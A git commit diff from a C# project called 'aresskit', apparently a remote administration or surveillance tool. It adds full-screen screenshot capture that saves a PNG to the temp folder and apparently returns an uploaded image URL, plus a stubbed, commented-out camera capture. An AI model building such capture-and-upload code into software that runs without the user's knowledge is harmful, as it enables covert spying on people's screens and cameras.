cdec11eae04f5023a3d294945c6d5fea096f2b56
Wįłłý Fœx <official.blackvikingpro@gmail.com>
2020-11-08 11:57:11 -0600

    working on camera capture feature

--- app/aresskit/Stream.cs
+++ app/aresskit/Stream.cs
@@ -1,17 +1,30 @@
-﻿using Newtonsoft.Json;
-using System.Drawing;
+﻿using System.Drawing;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
+using Newtonsoft.Json;
 
 namespace aresskit
+
 {
     // Thanks to: http://stackoverflow.com/a/18870847/5925502
     class Stream
     {
+        private static Bitmap Capture(int x, int y, int width, int height)
+        {
+            Bitmap screenShotBMP = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
+
+            Graphics screenShotGraphics = Graphics.FromImage(screenShotBMP);
+
+            screenShotGraphics.CopyFromScreen(new Point(x, y), Point.Empty, new Size(width, height), CopyPixelOperation.SourceCopy);
+            screenShotGraphics.Dispose();
+
+            return screenShotBMP;
+        }
+
         public static string CaptureScreenshot()
         {
             // Capture Screenshot
-            Bitmap myImage = Stream.Capture(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Bitmap myImage = Capture(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
             string ImagePath = System.IO.Path.GetTempPath() + Misc.RandomString(16) + ".png";
             myImage.Save(ImagePath, ImageFormat.Png);
 
@@ -20,16 +33,18 @@ namespace aresskit
             return json.url;
         }
 
-        private static Bitmap Capture(int x, int y, int width, int height)
+        public static string CaptureCamera()
         {
-            Bitmap screenShotBMP = new Bitmap(width, height, PixelFormat.Format32bppArgb);
+            // Capture Pic from Camera
+            /*
+            CameraCaptureUI captureUI = new CameraCaptureUI();
+            captureUI.PhotoSettings.Format = CameraCaptureUIPhotoFormat.Jpeg;
+            captureUI.PhotoSettings.CroppedSizeInPixels = new Size(200, 200);
 
-            Graphics screenShotGraphics = Graphics.FromImage(screenShotBMP);
+            StorageFile photo = await captureUI.CaptureFileAsync(CameraCaptureUIMode.Photo);
+            //*/
 
-            screenShotGraphics.CopyFromScreen(new Point(x, y), Point.Empty, new Size(width, height), CopyPixelOperation.SourceCopy);
-            screenShotGraphics.Dispose();
-
-            return screenShotBMP;
+            return "";
         }
     }
 }
